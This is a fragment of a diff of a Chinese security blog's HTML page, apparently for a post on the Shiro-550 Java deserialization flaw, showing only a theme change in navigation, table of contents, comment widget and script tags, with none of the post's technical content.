href="/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/"><img class="next-cover" src="/img/default.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">初探Java反序列化漏洞(二)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/07/01/Java ysoserial学习之CommonsCollections5(四)/" title="Java ysoserial学习之CommonsCollections5(四)"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-01</div><div class="title">Java ysoserial学习之CommonsCollections5(四)</div></div></a></div><div><a href="/2021/06/04/Java ysoserial学习之URLDNS(一)/" title="Java ysoserial学习之URLDNS(一)"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-04</div><div class="title">Java ysoserial学习之URLDNS(一)</div></div></a></div><div><a href="/2021/05/29/Java反序列化漏洞分析(二)-Shiro550/" title="Java反序列化漏洞分析(二)-Shiro550"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-29</div><div class="title">Java反序列化漏洞分析(二)-Shiro550</div></div></a></div><div><a href="/2021/04/16/初探Java反序列化漏洞(一)/" title="初探Java反序列化漏洞(一)"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-04-16</div><div class="title">初探Java反序列化漏洞(一)</div></div></a></div><div><a href="/2021/05/02/初探Java反序列化漏洞(二)/" title="初探Java反序列化漏洞(二)"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-02</div><div class="title">初探Java反序列化漏洞(二)</div></div></a></div><div><a href="/2021/06/27/Java ysoserial学习之CommonsCollections6(三)/" title="Java ysoserial学习之CommonsCollections6(三)"><img class="cover" src="/img/default.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-27</div><div class="title">Java ysoserial学习之CommonsCollections6(三)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yhy</div><div class="author-info__description">修道之初, 谁不想当剑仙?</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yhy0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yhy0" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">切换主题了</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x03 代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-rememberMe-cookie"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 rememberMe cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Shiro-500-%E4%B8%AD%E7%9A%84-AES-%E8%A7%A3%E5%AF%86"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 Shiro 500 中的 AES 解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/" title="git 蜜罐复现"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="git 蜜罐复现"/></a><div class="content"><a class="title" href="/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/" title="git 蜜罐复现">git 蜜罐复现</a><time datetime="2021-08-09T12:30:00.000Z" title="发表于 2021-08-09 20:30:00">2021-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/" title="Java ysoserial学习之CommonsCollections5(四)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections5(四)"/></a><div class="content"><a class="title" href="/2021/07/01/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections5(%E5%9B%9B)/" title="Java ysoserial学习之CommonsCollections5(四)">Java ysoserial学习之CommonsCollections5(四)</a><time datetime="2021-07-01T13:18:00.000Z" title="发表于 2021-07-01 21:18:00">2021-07-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/" title="Java ysoserial学习之CommonsCollections6(三)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections6(三)"/></a><div class="content"><a class="title" href="/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/" title="Java ysoserial学习之CommonsCollections6(三)">Java ysoserial学习之CommonsCollections6(三)</a><time datetime="2021-06-27T14:09:00.000Z" title="发表于 2021-06-27 22:09:00">2021-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/" title="Java ysoserial学习之CommonsCollections1(二)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之CommonsCollections1(二)"/></a><div class="content"><a class="title" href="/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/" title="Java ysoserial学习之CommonsCollections1(二)">Java ysoserial学习之CommonsCollections1(二)</a><time datetime="2021-06-11T12:30:00.000Z" title="发表于 2021-06-11 20:30:00">2021-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/" title="Java ysoserial学习之URLDNS(一)"><img src="/img/default.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java ysoserial学习之URLDNS(一)"/></a><div class="content"><a class="title" href="/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/" title="Java ysoserial学习之URLDNS(一)">Java ysoserial学习之URLDNS(一)</a><time datetime="2021-06-04T12:30:00.000Z" title="发表于 2021-06-04 20:30:00">2021-06-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By yhy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://fireline.fun/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
-                    
-                  </div>
-                
-              </div>
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
 
-              
-                <p class="note note-warning">
-                  
-                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                  
-                </p>
-              
-              
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Java反序列化漏洞分析(二)-Shiro550</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/">
-                        <span class="hidden-mobile">初探Java反序列化漏洞(二)</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
 
-            
-              <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-    <div id="msg">来杯奶茶</div>
-
-    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
-      <span>赏</span>
-    </button>
-    <div id="QR" style="display: none;">
-        <div id="wechat" style="display: inline-block">
-          <img id="wechat_qr" src="/img/wechatpay.jpg" srcset="/img/loading.gif" lazyload alt="微信打赏"/>
-          <p>微信打赏</p>
-        </div>
-    </div>
-</div>
-
-            
-
-            <!-- Custom -->
-            
-              <div class="col-lg-7 mx-auto nopadding-x-md">
-                <div class="container custom post-custom mx-auto">
-                  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210618143758.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5">
-                </div>
-              </div>
-            
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments" lazyload>
-                
-                  
-                
-                
-  <div id="valine"></div>
-  <script type="text/javascript">
-    Fluid.utils.lazyComments('valine', function() {
-      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
-        new Valine({
-          el: "#valine",
-          app_id: "vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz",
-          app_key: "GB9a9tvf5zPbYaxUShE01qk1",
-          placeholder: "说点什么",
-          path: window.location.pathname,
-          avatar: "robohash",
-          meta: ["nick","mail","link"],
-          pageSize: "10",
-          lang: "zh-CN",
-          highlight: true,
-          recordIP: false,
-          serverURLs: "https://vid2hnaa.lc-cn-n1-shared.com",
-        });
-      });
-    });
-  </script>
-  <noscript>Please enable JavaScript to view the
-    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
-  </noscript>
-
-
-              </article>
-            
-          </article>
-        </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-
-
-    
-
-    
-      <a id="scroll-top-button" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-    
-
-    
-  </main>
-
-  <footer class="text-center mt-5 py-3">
-  <div class="footer-content">
-     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/yhy0" target="_blank" rel="nofollow noopener"><span>YHY</span></a> 
-  </div>
-  
-  <div class="statistics">
-    
-    
-
-    
-      
-        <!-- 不蒜子统计PV -->
-        <span id="busuanzi_container_site_pv" style="display: none">
-            总访问量 
-            <span id="busuanzi_value_site_pv"></span>
-             次
-          </span>
-      
-      
-        <!-- 不蒜子统计UV -->
-        <span id="busuanzi_container_site_uv" style="display: none">
-            总访客数 
-            <span id="busuanzi_value_site_uv"></span>
-             人
-          </span>
-      
-    
-  </div>
-
-
-  
-
-  
-</footer>
-
-
-  <!-- SCRIPTS -->
-  
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'default',
+      })
+      false && mermaid.init()
     })
-  </script>
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'vID2hnAAj71HlTtLcwO4InbY-gzGzoHsz',
+      appKey: 'GB9a9tvf5zPbYaxUShE01qk1',
+      avatar: 'robohash',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
 
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
 
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
-
-
-
-  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-      typing(title)
-      
-    })(window, document);
-  </script>
-
-
-
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    (function () {
-      var path = "/local-search.xml";
-      $('#local-search-input').on('click', function() {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      });
-      $('#modalSearch').on('shown.bs.modal', function() {
-        $('#local-search-input').focus();
-      });
-    })()
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    <!-- Baidu Analytics -->
-    <script defer>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
-
-
-</body>
-</html>
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
